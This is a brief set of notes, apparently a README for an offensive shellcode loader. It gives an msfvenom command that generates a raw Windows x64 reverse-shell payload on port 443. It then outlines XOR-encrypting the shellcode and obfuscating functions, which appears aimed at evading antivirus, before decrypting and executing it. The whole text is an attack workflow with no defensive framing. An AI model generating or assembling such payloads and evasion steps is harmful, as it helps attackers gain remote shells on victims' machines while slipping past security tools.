### Generate msfvenome shellcode ###
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=443 -f raw -o code.bin

### encrypt shellcode ###
using xor-env-test.c to encrypt msfvenome generate file

### for function obuscation ###
use xorTest.c

### decrypt shellcode ###
### execute ###
